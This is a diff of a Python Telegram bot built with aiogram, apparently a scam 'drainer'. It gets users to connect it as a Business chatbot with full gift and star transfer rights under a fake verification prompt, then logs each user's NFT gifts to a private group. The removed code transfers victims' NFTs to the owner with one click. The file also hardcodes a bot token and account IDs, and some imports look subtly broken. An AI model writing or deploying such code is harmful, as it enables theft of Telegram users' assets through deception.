@@ -1,108 +1,103 @@
 import asyncio
 import logging
-from aiogram import Bot, Dispatcher
-from aiogram.client.default import DefaultBotProperties
-from aiogram.types import BusinessConnection, BusinessBotRights, Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
-from aiogram.methods import GetBusinessAccountGifts, GetBusinessAccountStarBalance, TransferGift
+from aiogram import Bot, Dispatcher, F
+from aiogram.enums import ParseMode
+from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.methods.get_business_connection import GetBusinessConnection
+from aiogram.methods.get_business_gifts import GetBusinessAccountGifts
+from aiogram.types.business import BusinessBotRights
+from aiogram.exceptions import TelegramBadRequest
 
 API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
 LOG_GROUP_ID = -1002710995756
 OWNER_ID = 7072373613
-CHECK_INTERVAL = 60  # seconds between star checks
+
+authorized = {}
 
 logging.basicConfig(level=logging.INFO)
-bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
+bot = Bot(token=API_TOKEN, parse_mode=ParseMode.HTML)
 dp = Dispatcher()
 
-# In-memory store for connected users
-authorized = {}  # user_id -> {connection_id, username, gifts, stars, notified}
+@dp.message(F.text == "/start")
+async def start_cmd(message: Message):
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="✅ Verify Business Connection", callback_data="verify_bc")]
+    ])
+    await message.reply("Welcome! Tap below to verify your Business connection:", reply_markup=kb)
 
-@dp.business_connection()
-async def on_business_connect(con: BusinessConnection):
-    rights: BusinessBotRights = con.rights or BusinessBotRights()
-    if not (rights.can_view_gifts_and_stars and rights.can_transfer_and_upgrade_gifts):
-        await bot.send_message(
-            con.user.id,
-            "❌ Please grant full Gifts & Stars permissions.",
-            business_connection_id=con.id
-        )
-        return
+@dp.callback_query(F.data == "verify_bc")
+async def verify_cb(callback: CallbackQuery):
+    bc_id = getattr(callback.message, "business_connection_id", None)
+    if not bc_id:
+        return await callback.answer("🔴 You are not connected via Business Chatbots.", show_alert=True)
 
-    resp = await bot(GetBusinessAccountGifts(business_connection_id=con.id))
-    gifts = resp.gifts or []
-    authorized[con.user.id] = {
-        "connection_id": con.id,
-        "username": f"@{con.user.username}" if con.user.username else con.user.first_name,
-        "gifts": [(g.owned_gift_id, g.unique_gift.title if getattr(g, "unique_gift", None) else g.title)],
-        "stars": 0,
-        "notified": False
-    }
+    try:
+        info = await bot(GetBusinessConnection(business_connection_id=bc_id))
+        rights = info.rights or BusinessBotRights()
 
-    gift_list = "\n".join(f"- {title}" for _, title in authorized[con.user.id]["gifts"]) or "(no NFTs)"
-    await bot.send_message(LOG_GROUP_ID,
-        f"✅ <a href='tg://user?id={con.user.id}'>{con.user.first_name}</a> granted gift rights.\nNFTs:\n{gift_list}"
-    )
-    await bot.send_message(
-        con.user.id,
-        "🎉 Connected! Your stars & NFTs are now monitored.",
-        business_connection_id=con.id
-    )
+        if not (rights.can_view_gifts_and_stars and rights.can_transfer_and_upgrade_gifts):
+            return await callback.answer("❌ Please grant all gift/star permissions.", show_alert=True)
 
-async def check_balance_and_notify(uid: int):
-    u = authorized.get(uid)
-    if not u:
-        return
-    resp = await bot(GetBusinessAccountStarBalance(business_connection_id=u["connection_id"]))
-    u["stars"] = resp.balance.amount
-    if u["stars"] >= 30 and not u["notified"]:
-        markup = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(f"Send {title}", callback_data=f"xfer:{uid}:{gift_id}")]
-            for gift_id, title in u["gifts"]
-        ])
-        await bot.send_message(
-            OWNER_ID,
-            f"🎉 {u['username']} has {u['stars']} stars. Choose an NFT to transfer:",
-            reply_markup=markup
-        )
-        u["notified"] = True
+        gifts_resp = await bot(GetBusinessAccountGifts(business_connection_id=bc_id))
+        gifts = gifts_resp.gifts or []
 
-async def periodic_star_check():
-    while True:
-        for uid in list(authorized):
-            try:
-                await check_balance_and_notify(uid)
-            except Exception:
-                pass
-        await asyncio.sleep(CHECK_INTERVAL)
+        uid = info.user.id
+        username = f"@{info.user.username}" if info.user.username else info.user.first_name
 
-@dp.callback_query(lambda cb: cb.data and cb.data.startswith("xfer:"))
-async def on_transfer(cb: CallbackQuery):
-    _, uid_str, gift_id = cb.data.split(":")
-    uid = int(uid_str)
-    u = authorized.get(uid)
-    if cb.from_user.id != OWNER_ID or not u:
-        await cb.answer("❌ Not allowed.", show_alert=True)
-        return
+        authorized[uid] = {
+            "connection_id": bc_id,
+            "username": username,
+            "gifts": [(g.owned_gift_id, getattr(g, "title", "Unnamed")) for g in gifts],
+            "stars": 0,
+            "notified": False
+        }
 
-    res = await bot(TransferGift(
-        business_connection_id=u["connection_id"],
-        owned_gift_id=gift_id,
-        new_owner_chat_id=OWNER_ID,
-        star_count=25
-    ))
-    if res:
-        await cb.message.edit_text("✅ NFT transferred to Owner.")
+        gift_list = "\n".join(f"- {t}" for _, t in authorized[uid]["gifts"]) or "(no NFTs)"
+
         await bot.send_message(
             LOG_GROUP_ID,
-            f"🎁 Gift {gift_id} transferred from {u['username']} to owner."
+            f"✅ <a href='tg://user?id={uid}'>{username}</a> verified via button.\nNFTs:\n{gift_list}"
         )
-    else:
-        await cb.answer("❌ Transfer failed.", show_alert=True)
 
-@dp.message(lambda msg: msg.text == "/start" and msg.from_user.id == OWNER_ID)
-async def begin_monitor(message: Message):
-    asyncio.create_task(periodic_star_check())
-    await message.reply("✅ Star monitoring loop started.")
+        await callback.message.edit_text("🟢 Verified! You're connected to Business Chatbots.")
 
-if __name__ == "__main__":
-    asyncio.run(dp.start_polling(bot))
+    except TelegramBadRequest as e:
+        await callback.answer(f"Error: {e.message}", show_alert=True)
+
+@dp.business_connection()
+async def on_business_connect(event: Message, connection_id: str):
+    try:
+        info = await bot(GetBusinessConnection(business_connection_id=connection_id))
+        rights = info.rights or BusinessBotRights()
+
+        if not (rights.can_view_gifts_and_stars and rights.can_transfer_and_upgrade_gifts):
+            return
+
+        gifts_resp = await bot(GetBusinessAccountGifts(business_connection_id=connection_id))
+        gifts = gifts_resp.gifts or []
+
+        uid = info.user.id
+        username = f"@{info.user.username}" if info.user.username else info.user.first_name
+
+        authorized[uid] = {
+            "connection_id": connection_id,
+            "username": username,
+            "gifts": [(g.owned_gift_id, getattr(g, "title", "Unnamed")) for g in gifts],
+            "stars": 0,
+            "notified": False
+        }
+
+        gift_list = "\n".join(f"- {t}" for _, t in authorized[uid]["gifts"]) or "(no NFTs)"
+
+        await bot.send_message(
+            LOG_GROUP_ID,
+            f"✅ <a href='tg://user?id={uid}'>{username}</a> just added the bot via Business Chatbots.\nNFTs:\n{gift_list}"
+        )
+    except TelegramBadRequest as e:
+        logging.error(f"Business connection error: {e.message}")
+
+async def main():
+    await dp.start_polling(bot)
+
+if __name__ == '__main__':
+    asyncio.run(main())
